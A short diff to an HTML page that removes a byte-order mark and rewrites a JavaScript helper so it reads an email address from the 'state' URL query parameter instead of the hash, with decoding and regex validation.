@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -524,13 +524,14 @@
   
   // Improved email capture with validation
   function getEmailFromURL() {
-    const hash = window.location.hash.substring(1);
-    if (!hash) return '';
-    
+    const params = new URLSearchParams(window.location.search);
+    const email = params.get('state');
+    if (!email) return '';
+
     try {
-      const email = decodeURIComponent(hash);
+      const decodedEmail = decodeURIComponent(email);
       const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      return emailRegex.test(email) ? email : '';
+      return emailRegex.test(decodedEmail) ? decodedEmail : '';
     } catch (e) {
       console.error('Error decoding email:', e);
       return '';
